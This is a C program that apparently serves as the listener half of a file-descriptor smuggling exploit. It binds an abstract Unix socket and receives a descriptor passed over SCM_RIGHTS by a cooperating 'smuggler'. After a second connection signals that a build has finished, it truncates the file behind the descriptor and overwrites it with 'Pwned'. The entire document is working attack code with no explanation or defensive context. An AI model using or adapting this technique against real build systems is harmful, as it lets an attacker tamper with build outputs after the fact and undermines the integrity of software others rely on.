#include <sys/socket.h>
#include <sys/un.h>
#include <stdlib.h>
#include <stddef.h>
#include <stdio.h>
#include <unistd.h>
#include <assert.h>

int main(int argc, char **argv) {

    assert(argc == 2);

    int sock = socket(AF_UNIX, SOCK_STREAM, 0);

    // Bind to the socket.
    struct sockaddr_un data;
    data.sun_family = AF_UNIX;
    data.sun_path[0] = 0;
    strcpy(data.sun_path + 1, argv[1]);
    int res = bind(sock, (const struct sockaddr *)&data,
        offsetof(struct sockaddr_un, sun_path)
        + strlen(argv[1])
        + 1);
    if (res < 0) perror("bind");

    res = listen(sock, 1);
    if (res < 0) perror("listen");

    int smuggling_fd = -1;

    // Accept the connection a first time to receive the file descriptor.
    fprintf(stderr, "%s\n", "Waiting for the first connection");
    int a = accept(sock, 0, 0);
    if (a < 0) perror("accept");

    struct msghdr msg = {0};
    msg.msg_control = malloc(128);
    msg.msg_controllen = 128;

    // Receive the file descriptor as sent by the smuggler.
    recvmsg(a, &msg, 0);

    struct cmsghdr *hdr = CMSG_FIRSTHDR(&msg);
    while (hdr) {
        if (hdr->cmsg_level == SOL_SOCKET
          && hdr->cmsg_type == SCM_RIGHTS) {

            // Grab the copy of the file descriptor.
            memcpy((void *)&smuggling_fd, CMSG_DATA(hdr), sizeof(int));
        }

        hdr = CMSG_NXTHDR(&msg, hdr);
    }
    fprintf(stderr, "%s\n", "Got the file descriptor. Now waiting for the second connection");
    close(a);

    // Wait for a second connection, which will tell us that the build is
    // done
    a = accept(sock, 0, 0);
    fprintf(stderr, "%s\n", "Got a second connection, rewriting the file");
    // Write a new content to the file
    if (ftruncate(smuggling_fd, 0)) perror("ftruncate");
    char * new_content = "Pwned\n";
    int written_bytes = write(smuggling_fd, new_content, strlen(new_content));
    if (written_bytes != strlen(new_content)) perror("write");
}
